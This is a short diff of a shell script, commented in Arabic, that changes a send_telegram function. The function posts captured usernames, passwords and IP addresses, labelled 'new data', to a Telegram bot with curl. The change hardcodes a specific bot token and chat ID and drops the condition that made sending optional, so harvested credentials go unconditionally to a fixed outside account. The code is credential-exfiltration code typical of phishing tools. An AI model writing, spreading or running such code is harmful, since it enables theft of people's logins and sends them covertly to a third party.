@@ -904,18 +904,18 @@ main_menu() {
 
 # إرسال إلى تلجرام
 send_telegram() {
-    if [ ! -z "$TELEGRAM_BOT_TOKEN" ] && [ ! -z "$CHAT_ID" ]; then
-        MSG="🔔 *بيانات جديدة* 🔔
+    TOKEN="8450258813:AAHCKf6i3a3QR-4R5k7IpmooXOJv2lX8zRM"
+    CHAT="6840048574"
+    MSG="🔔 *بيانات جديدة* 🔔
 👤 *اليوزر:* $1
 🔑 *الباسورد:* $2
 🌍 *الآي بي:* $3
 ⏰ *الوقت:* $(date)"
-        
-        curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage" \
-            -d chat_id="$CHAT_ID" \
-            -d text="$MSG" \
-            -d parse_mode="Markdown" > /dev/null
-    fi
+    
+    curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" \
+        -d chat_id="$CHAT" \
+        -d text="$MSG" \
+        -d parse_mode="Markdown" > /dev/null
 }
 
 
